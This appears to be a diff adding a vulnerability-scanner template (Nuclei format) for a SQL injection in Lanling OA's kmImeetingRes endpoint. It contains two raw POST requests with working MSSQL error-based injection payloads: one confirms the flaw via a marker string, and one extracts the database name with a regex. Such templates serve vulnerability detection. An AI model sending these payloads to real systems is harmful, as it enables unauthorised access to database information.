@@ -1,0 +1,56 @@
+id: lanling-oa-sql-injection
+
+info:
+  name: Lanling OA kmimeetingres SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Lanling OA office system is an OA office tool for instant office communication.
+    There is a SQL injection vulnerability in the digital OA of Shenzhen Lanling Software Co., Ltd.,
+    which can be used by attackers to obtain sensitive database information.
+  classification:
+    cvss-score: 5
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Cookie: JSESSIONID=99376761BDEF37E18D3F52A3AC156A55
+
+        var=%7B%22body%22%3A%7B%22file%22%3A%22%2Fkm%2Fimeeting%2Fkm_imeeting_res%2FkmImeetingRes.do%3FcontentType=json%22%7D%7D&method=listUse&orderby=1%20,(SELECT%207903%20WHERE%207903=CONVERT(INT,(SELECT%20CHAR(113)%2BCHAR(120)%2BCHAR(98)%2BCHAR(98)%2BCHAR(113)%2BCHAR(113)%2BCHAR(112)%2BCHAR(107)%2BCHAR(118)%2BCHAR(113))))&ordertype=down&s_ajax=true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "qxbbqqpkvq"
+
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Cookie: JSESSIONID=99376761BDEF37E18D3F52A3AC156A55
+
+        var=%7B%22body%22%3A%7B%22file%22%3A%22%2Fkm%2Fimeeting%2Fkm_imeeting_res%2FkmImeetingRes.do%3FcontentType=json%22%7D%7D&method=listUse&orderby=1%20%2C%28SELECT%207903%20WHERE%207903%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28DB_NAME()%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29%29&ordertype=down&s_ajax=true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "qxbbq(.*?)qpkvq"
